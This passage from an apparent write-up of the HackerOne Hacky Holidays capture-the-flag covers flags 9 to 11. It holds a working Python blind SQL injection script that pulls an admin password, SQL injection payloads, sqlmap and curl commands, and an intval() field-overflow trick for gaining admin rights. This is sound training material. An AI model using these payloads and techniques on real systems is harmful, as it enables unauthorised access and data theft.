class="string">&quot;session=3626b9d86722055e8e74c12700e54ba1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL Injections Payloads</span></span><br><span class="line">db_name_payload    = <span class="string">&quot;name=castilho&#x27; OR (ascii(substr((select database()),%s,1))) = %s;&quot;</span></span><br><span class="line">password_payload   = <span class="string">&quot;name=castilho&#x27; OR (ascii(substr((select password from admin limit 0,1) ,%s,1))) = %s;&quot;</span></span><br><span class="line">table_name_payload = <span class="string">&quot;name=castilho&#x27; OR (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,%s,1))) = %s;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retrive_data</span>(<span class="params">payload</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Variables</span></span><br><span class="line">    data_end  = <span class="literal">False</span></span><br><span class="line">    data_retrieved = <span class="string">&quot;&quot;</span></span><br><span class="line">    data_char_position = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># Run until there&#x27;s nothing to retrieve</span></span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n\t--== Flag 9 Exploit ==--\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\t[+] Retrieving Data: %s &quot;</span> % data_retrieved) <span class="comment"># Output data returned</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ascii_value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>): <span class="comment"># Loop throw all the ASCII characters values</span></span><br><span class="line"></span><br><span class="line">            requests.post(target, payload % (<span class="built_in">str</span>(data_char_position) ,<span class="built_in">str</span>(ascii_value)), headers=headers) <span class="comment"># Send SQL Injection Payload</span></span><br><span class="line">            response = requests.get(target + <span class="string">&quot;/score&quot;</span>, headers=headers) <span class="comment"># Get the response from the payload</span></span><br><span class="line"></span><br><span class="line">            phrase = re.findall(<span class="string">&#x27;&lt;div style=&quot;margin-top:20px&quot;&gt;(.+?)&lt;/div&gt;&#x27;</span>, response.text) <span class="comment"># Get number of players phrase from response</span></span><br><span class="line">            splited_phrase = phrase[<span class="number">0</span>].split() <span class="comment"># Split the phrase by spaces</span></span><br><span class="line">            number_players = splited_phrase[<span class="number">2</span>] <span class="comment"># Get and Store number of players</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> number_players != <span class="string">&quot;0&quot;</span>: <span class="comment"># If number of players is different then 0, a character was found</span></span><br><span class="line">                data_retrieved += <span class="built_in">chr</span>(ascii_value) <span class="comment"># Add character to &quot;data_retrieved&quot;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> ascii_value == <span class="number">126</span>: <span class="comment"># Else if the loop ends, there&#x27;s nothing more to retrieve</span></span><br><span class="line">                data_end = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data_end:</span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># Program stops here</span></span><br><span class="line"></span><br><span class="line">        data_char_position += <span class="number">1</span> <span class="comment"># If a character was found, brute-force next one</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============================================================================================================================</span></span><br><span class="line"><span class="comment"># Program &#x27;Flag 9 Exploit&#x27; starts here</span></span><br><span class="line">retrive_data(password_payload)</span><br></pre></td></tr></table></figure>

<p>Essentially, how this script works is brute-forcing each character using the <strong>ASCII</strong> table.<br /><br>Also a reminder, this is a <strong>slowwww</strong> challenge. The reason why is it slow, is because we need to send our SQLI payload via a <strong>POST</strong> request and return the response from <strong>another</strong> endpoint.<br>I mean, sure I could’ve added multi-threading and make some tweaks to make it a little faster, but I’ll leave that for you curious ones.<br /><br>Bellow, you can see how the script output looks like. In this example we are brute-forcing the final <strong>Admin password</strong> :</p>
<p><strong>Running Script Example ( The GIF is speeded up )</strong></p>
<p><img src="/images/hackerone-ctf/flag9_script.gif" alt="Flag 9 GIF"></p>
<p>And finally, with our credencials <code>admin:S3creT_p4ssw0rd-$</code>, we can now login into the <code>/admin</code> area and retrieve our ninth flag :</p>
<p><img src="/images/hackerone-ctf/flag9_flag.png" alt="Flag 9 Flag"></p>
<h3 id="Flag-10-Signup-Manager"><a href="#Flag-10-Signup-Manager" class="headerlink" title="Flag 10 | Signup Manager"></a>Flag 10 | Signup Manager</h3><p>Information for this challenge :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You&#x27;ve made it this far! The grinch is recruiting for his army to ruin the holidays but they&#x27;re very picky on who they let in!</span><br></pre></td></tr></table></figure>

<p>Now I got to say, flag 10 was my favorite flag from all CTF because you had to be a little creative to solve this one, so let’s get right into it.<br /><br>Running our usual ffuf scan, get us the <code>/README.md</code> endpoint :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/signup-manager/FUZZ -w common.txt</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/signup-manager/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: common.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">README.md               [Status: 200, Size: 712, Words: 121, Lines: 19]</span><br><span class="line">:: Progress: [3160/3160] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:07] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Opening the <strong>README.md</strong> file gets us interesting information :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># SignUp Manager</span><br><span class="line"></span><br><span class="line">SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.</span><br><span class="line"></span><br><span class="line">### How to Install</span><br><span class="line"></span><br><span class="line">1) Create a directory that you wish SignUp Manager to be installed into</span><br><span class="line">2) Move signupmanager.zip into the new directory and unzip it.</span><br><span class="line">3) For security move users.txt into a directory that cannot be read from website visitors</span><br><span class="line">4) Update index.php with the location of your users.txt file</span><br><span class="line">5) Edit the user and admin php files to display your hidden content</span><br><span class="line">6) You can make anyone an admin by changing the last character in the users.txt file to a Y &lt;-- Important</span><br><span class="line">7) Default login is admin / password</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>With this information, I immediately downloaded the <code>/signup-manager/signupmanager.zip</code>, fired up <strong>xampp</strong>, and started reviewing the app and the code locally.<br /><br>So registering a new user on the app and checking the <code>user.txt</code> file, we get :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Token: castilho#######0830e53823a51a0ad56237e2e1906b6a4b2d2a6bf4ca28a31bd4284fcb6dff300##castilho#######castilho#######N</span><br></pre></td></tr></table></figure>

<p>This looks a bit confusing, so let’s take this <strong>token</strong> apart :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">castilho####### &gt;-------------------&lt; Username </span><br><span class="line">0830e53823a51a0ad56237e2e1906b6a &gt;--&lt; Password</span><br><span class="line">4b2d2a6bf4ca28a31bd4284fcb6dff30 &gt;--&lt; Cookie</span><br><span class="line">0## &gt;-------------------------------&lt; Age</span><br><span class="line">castilho####### &gt;-------------------&lt; First Name</span><br><span class="line">castilho####### &gt;-------------------&lt; Last Name</span><br><span class="line">N &gt;---------------------------------&lt; Role (N = User | Y = Admin)</span><br></pre></td></tr></table></figure>

<p><strong>Note</strong>: The <code>#</code> is the space that we can still fill</p>
<p>From what we’ve now, the goal here is to turn the <code>N</code> into <code>Y</code> and with that, privilege our permissions and turn ourselves into an <strong>Admin</strong>.<br /><br>My first thought when starting the challenge was to <strong>spam</strong> the last name with characters to see if the last character would change position.<br /><br>So trying that by inserting <code>castilhoABCDEFGHIJKLMNOPQRSTUVWXYZ</code>, we get :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Token: castilho#######0830e53823a51a0ad56237e2e1906b6a1d43cb2f6522763a58eb083f6d14996e0##castilho#######castilhoABCDEFGN</span><br></pre></td></tr></table></figure>

<p>But didn’t worked because we have a <strong>15 limited</strong> last name, and as you can see above, the <code>N</code> did not change position.<br>We can also confirm this by reviewing the function <code>addUser()</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$age</span>,<span class="variable">$firstname</span>,<span class="variable">$lastname</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$random_hash</span> = md5(print_r(<span class="variable">$_SERVER</span>,<span class="literal">true</span>).print_r(<span class="variable">$_POST</span>,<span class="literal">true</span>).date(<span class="string">&quot;U&quot;</span>).microtime().rand());</span><br><span class="line">    <span class="variable">$line</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$line</span> .= str_pad( <span class="variable">$username</span>,<span class="number">15</span>,<span class="string">&quot;#&quot;</span>);</span><br><span class="line">    <span class="variable">$line</span> .= <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$line</span> .= <span class="variable">$random_hash</span>;</span><br><span class="line">    <span class="variable">$line</span> .= str_pad( <span class="variable">$age</span>,<span class="number">3</span>,<span class="string">&quot;#&quot;</span>);</span><br><span class="line">    <span class="variable">$line</span> .= str_pad( <span class="variable">$firstname</span>,<span class="number">15</span>,<span class="string">&quot;#&quot;</span>);</span><br><span class="line">    <span class="variable">$line</span> .= str_pad( <span class="variable">$lastname</span>,<span class="number">15</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">// &lt;-- Here</span></span><br><span class="line">    <span class="variable">$line</span> .= <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="variable">$line</span> = substr(<span class="variable">$line</span>,<span class="number">0</span>,<span class="number">113</span>);</span><br><span class="line">    file_put_contents(<span class="string">&#x27;users.txt&#x27;</span>,<span class="variable">$line</span>.PHP_EOL, FILE_APPEND);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_hash</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After some time, while reviewing the <code>buildUsers()</code> function, we can find that his using the function <code>intval()</code> unlike the others.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildUsers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$users</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$users_txt</span> = file_get_contents(<span class="string">&#x27;users.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>( explode(PHP_EOL,<span class="variable">$users_txt</span>) <span class="keyword">as</span> <span class="variable">$user_str</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span>( strlen(<span class="variable">$user_str</span>) == <span class="number">113</span> ) &#123;</span><br><span class="line">            <span class="variable">$username</span> = str_replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>, substr(<span class="variable">$user_str</span>, <span class="number">0</span>, <span class="number">15</span>));</span><br><span class="line">            <span class="variable">$users</span>[<span class="variable">$username</span>] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span> =&gt; str_replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>, substr(<span class="variable">$user_str</span>, <span class="number">15</span>, <span class="number">32</span>)),</span><br><span class="line">                <span class="string">&#x27;cookie&#x27;</span> =&gt; str_replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>, substr(<span class="variable">$user_str</span>, <span class="number">47</span>, <span class="number">32</span>)),</span><br><span class="line">                <span class="string">&#x27;age&#x27;</span> =&gt; intval(str_replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>, substr(<span class="variable">$user_str</span>, <span class="number">79</span>, <span class="number">3</span>))), <span class="comment">// &lt;-- Here</span></span><br><span class="line">                <span class="string">&#x27;firstname&#x27;</span> =&gt; str_replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>, substr(<span class="variable">$user_str</span>, <span class="number">82</span>, <span class="number">15</span>)),</span><br><span class="line">                <span class="string">&#x27;lastname&#x27;</span> =&gt; str_replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>, substr(<span class="variable">$user_str</span>, <span class="number">97</span>, <span class="number">15</span>)),</span><br><span class="line">                <span class="string">&#x27;admin&#x27;</span> =&gt; ((substr(<span class="variable">$user_str</span>, <span class="number">112</span>, <span class="number">1</span>) === <span class="string">&#x27;Y&#x27;</span>) ? <span class="literal">true</span> : <span class="literal">false</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$users</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So, after some research on the function <code>intval()</code>, we find out that it accepts <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.intval.php">A LOT</a> of differences inputs.<br /><br>Interestingly there’s one type of input that <strong>sticks out</strong> from the others, and that is <a target="_blank" rel="noopener" href="https://www.tutorialfor.com/questions-296630.htm">1e1</a>.<br /><br>With that and the <strong>3 character age input limit</strong> in mind, I created another user using <strong>BurpSuite</strong> but this time inserted <code>1e3</code> as the age value and inserted <code>castilhoABCDEFG</code> as our last name. Now analyzing the token, we ended up with :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Token: castilho#######0830e53823a51a0ad56237e2e1906b6a57a13b19373eb4ac1e10c9c7b5af31671000castilho#######castilhoABCDEFG</span><br><span class="line"></span><br><span class="line">castilho####### &gt;-------------------&lt; Username </span><br><span class="line">0830e53823a51a0ad56237e2e1906b6a &gt;--&lt; Password</span><br><span class="line">57a13b19373eb4ac1e10c9c7b5af3167 &gt;--&lt; Cookie</span><br><span class="line">100 &gt;-------------------------------&lt; Age</span><br><span class="line">0castilho###### &gt;-------------------&lt; First Name</span><br><span class="line">#castilhoABCDEF &gt;-------------------&lt; Last Name</span><br><span class="line">G &gt;---------------------------------&lt; Role (N = User | Y = Admin)</span><br></pre></td></tr></table></figure>

<p>As we can see, we succeeded to bypass the age limited size <code>(Input 1e3 --&gt; Output 1000)</code> by exploiting the <code>intval()</code> function, and if we look at the end of the token, on the last position we have now the <code>G</code> that is from our <strong>last name</strong> input and the <code>N</code> disappeared.<br>The only thing left to do, now that we know how to exploit this issue, is changing the <code>G</code> from our <strong>last name</strong> input and turn it into <code>Y</code>, like so <code>castilhoABCDEFY</code>, and with that become an <strong>Admin</strong>.<br /><br /><br>So re-doing everything but this time in the principal CTF app on <strong>hackyholidays.h1ctf.com</strong>, we get our tenth flag and what appears to be a link to the <strong>Challenge 11</strong> :</p>
<p><img src="/images/hackerone-ctf/flag10_flag.png" alt="Flag 10 Flag"></p>
<h3 id="Flag-11-Hell-on-my-Browser"><a href="#Flag-11-Hell-on-my-Browser" class="headerlink" title="Flag 11 | Hell on my Browser"></a>Flag 11 | Hell on my Browser</h3><p>From this challenge forward, there’s no more information to guide us, so we go headfirst into it.<br /><br /><br><strong>Note</strong>: I would like to say that I’ve never faced this kind of challenge before and in the middle of the flag I was stuck, so me and other guys that were also in the same situation, teamed up to defeat this beast but anyway, enough of that, let’s get ready for some big brain time !<br /></p>
<p>Starting out with our normal <strong>ffuf</strong> scan, we retrieve <strong>2 endpoints</strong> :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -w common.txt</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: common.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]</span><br><span class="line">picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]</span><br><span class="line">:: Progress: [3160/3160] :: Job [1/1] :: 423 req/sec :: Duration: [0:00:07] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>

<p>The home page of the challenge presents us, 3 albums :</p>
<ul>
<li>Xmas 2020</li>
<li>Xmas 2019</li>
<li>Xmas 2018</li>
</ul>
<p><img src="/images/hackerone-ctf/flag11_albums.png" alt="Flag 11 Albums"></p>
<p>Accessing the <code>/api</code> endpoint will get us some valuable information. From that we can guess that we need to find endpoints on the <code>/api/</code> endpoint:</p>
<p><img src="/images/hackerone-ctf/flag11_api.png" alt="Flag 11 API"></p>
<p>But when trying to recon the <code>/api/*</code> endpoint with ffuf, the only thing we would get was :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">401	Unauthenticated Request or Invalid client IP</span><br></pre></td></tr></table></figure>

<p>Which gives us the information that there’s validation going.<br /><br>Going into the <code>Xmas 2020</code> album, on the URL bar we can find a <code>/hash=jdh34k</code> parameter and checking his source code, we can retrieve <code>/picture</code> endpoints which seem base64 encoded :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9</span><br><span class="line">/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9</span><br><span class="line">/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9</span><br></pre></td></tr></table></figure>

<p>Decoding the base64 values will get us :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ cat picture_values.txt | base64 -d</span><br><span class="line">&#123;&quot;image&quot;:&quot;r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg&quot;,&quot;auth&quot;:&quot;bbf295d686bd2af346fcd80c5398de9a&quot;&#125;</span><br><span class="line">&#123;&quot;image&quot;:&quot;r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg&quot;,&quot;auth&quot;:&quot;e934f4407a9df9fd272cdb9c397f673f&quot;&#125;</span><br><span class="line">&#123;&quot;image&quot;:&quot;r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg&quot;,&quot;auth&quot;:&quot;94fb398d78b36e7c079e7560ce9df721&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>The next thought was to try for LFI ( Local File Inclusion ) and with it get some file from the server, but altering the “<strong>image</strong>“ value with <code>r3c0n_server_4fdk59/uploads/../api</code>, encoding it, and sending it, will give an error of <code>invalid authentication hash</code> :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9Cg==</span><br><span class="line">invalid authentication hash</span><br></pre></td></tr></table></figure>

<p> With that, we know there’s some validation between the “<strong>image</strong>“ value and the hash, so somehow we need to make the server <em>generate the hash</em> for our custom <strong>image path’s</strong>.<br /><br /><br>With that in mind, after some time exploring the app, we can find out that there’s a <strong>Boolean-based SQL Injection</strong> vulnerability on the <code>hash</code> parameter. To confirm this, we can insert the following payloads:</p>
<ul>
<li>Input = <code>/album?hash=jdh34k&#39; and &#39;1&#39;=1;</code> -| Output = <code>200 Status Code</code></li>
<li>Input = <code>/album?hash=jdh34k&#39; and &#39;1&#39;=2;</code> -| Output = <code>404 Status Code</code></li>
</ul>
<p><img src="/images/hackerone-ctf/flag11_sqli.png" alt="Flag 11 SQLI"></p>
<p>The next step was to dump all the data with <strong>sqlmap</strong> which will give us <strong>2 tables</strong> :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump</span><br><span class="line"></span><br><span class="line">Database: recon</span><br><span class="line">Table: album                            Table: photo</span><br><span class="line">+------+--------+-----------+           +----------+------+--------------------------------------+  </span><br><span class="line">| id   | hash   | name      |           | album_id | id   | photo                                |</span><br><span class="line">+------+--------+-----------+           +----------+------+--------------------------------------+</span><br><span class="line">| 1    | 3dir42 | Xmas 2018 |           | 1        | 1    | 0a382c6177b04386e1a45ceeaa812e4e.jpg |</span><br><span class="line">| 2    | 59grop | Xmas 2019 |           | 1        | 2    | 1254314b8292b8f790862d63fa5dce8f.jpg |</span><br><span class="line">| 3    | jdh34k | Xmas 2020 |           | 2        | 3    | 32febb19572b12435a6a390c08e8d3da.jpg |</span><br><span class="line">+------+--------+-----------+           | 3        | 4    | db507bdb186d33a719eb045603020cec.jpg |</span><br><span class="line">                                        | 3        | 5    | 9b881af8b32ff07f6daada95ff70dc3a.jpg |</span><br><span class="line">                                        | 3        | 6    | 13d74554c30e1069714a5a9edda8c94d.jpg |</span><br><span class="line">                                        +----------+------+--------------------------------------+ </span><br></pre></td></tr></table></figure>

<p>From these tables, we can start to guess how the <strong>back-end</strong> works and what <strong>queries</strong> are being made. Let’s take the <code>Xmas 2020</code> album as an example :<br /></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, hash, name FROM album WHERE hash=&#x27;jdh34k&#x27;</span><br><span class="line">+----+--------+-----------+</span><br><span class="line">| id | hash   | name      |</span><br><span class="line">+----+--------+-----------+</span><br><span class="line">| 3  | jdh34k | Xmas 2020 |</span><br><span class="line">+----+--------+-----------+</span><br><span class="line">...</span><br><span class="line">SELECT id, album_id, photo FROM photo WHERE album_id=&#x27;3&#x27;</span><br><span class="line">+----+----------+--------------------------------------+</span><br><span class="line">| id | album_id | photo                                |</span><br><span class="line">+----+----------+--------------------------------------+</span><br><span class="line">| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |</span><br><span class="line">| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |</span><br><span class="line">| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |</span><br><span class="line">+----+----------+--------------------------------------+</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackerone-ctf/flag11_normal.png" alt="Flag 11 Normal"></p>
<p>Now that we have a good understanding of what is going on backstage, we can start to think of ways to exploit this issue.<br>Do you remember the hash that was being generated by the server to validate the image path? I mean sure we could think about rewriting the image path’s into the photo table but our user only has <strong>read</strong> permissions so what about we use <code>UNION</code> to select our own values and with that altering the image path? Sound’s complicated but let’s start from the beginning :</p>
<p><strong>What is UNION</strong></p>
<p>In SQL, the <code>UNION</code> command combines the result set of two or more SELECT statements.<br /><br>Let me show you an example using our <strong>album</strong> table and the <strong>hash parameter</strong>:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Without UNION</span><br><span class="line"></span><br><span class="line">SELECT id, hash, name FROM album WHERE hash=&#x27;jdh34k&#x27;</span><br><span class="line">+----+--------+-----------+</span><br><span class="line">| id | hash   | name      |</span><br><span class="line">+----+--------+-----------+</span><br><span class="line">| 3  | jdh34k | Xmas 2020 |</span><br><span class="line">+----+--------+-----------+</span><br><span class="line"></span><br><span class="line">--&gt; With UNION</span><br><span class="line"></span><br><span class="line">SELECT id, hash, name FROM album WHERE hash=&#x27;jdh34k&#x27; UNION SELECT &quot;custom_id&quot;,&quot;custom_hash&quot;,&quot;custom_name&quot;</span><br><span class="line">+-----------+-------------+-------------+</span><br><span class="line">| id        | hash        | name        |</span><br><span class="line">+-----------+-------------+-------------+</span><br><span class="line">| 3         | jdh34k      | Xmas 2020   |</span><br><span class="line">| custom_id | custom_hash | custom_name |</span><br><span class="line">+-----------+-------------+-------------+</span><br><span class="line"></span><br><span class="line">--&gt; With UNION but &#x27;castilho&#x27; as the hash value </span><br><span class="line"> - We get only the custom values because the hash value 